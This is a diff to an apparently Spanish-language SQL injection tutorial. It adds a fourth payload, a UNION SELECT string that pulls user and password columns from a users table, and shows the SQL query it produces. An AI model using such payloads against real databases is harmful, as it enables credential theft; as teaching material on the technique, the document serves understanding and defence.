@@ -135,6 +135,18 @@ Es lo mismo que hacer una consulta sql:
 SELECT * FROM users WHERE id = '1' ORDER BY 1 -- -';
 
 ```
+#### Payload 4:
+```bash
+' UNION SELECT user, password FROM users#
+
+```
+
+Es lo mismo que hacer una consulta sql:
+```bash
+
+SELECT id, name FROM products WHERE id = '' UNION SELECT user, password FROM users#';
+
+```
 
 <table>
   <tr>
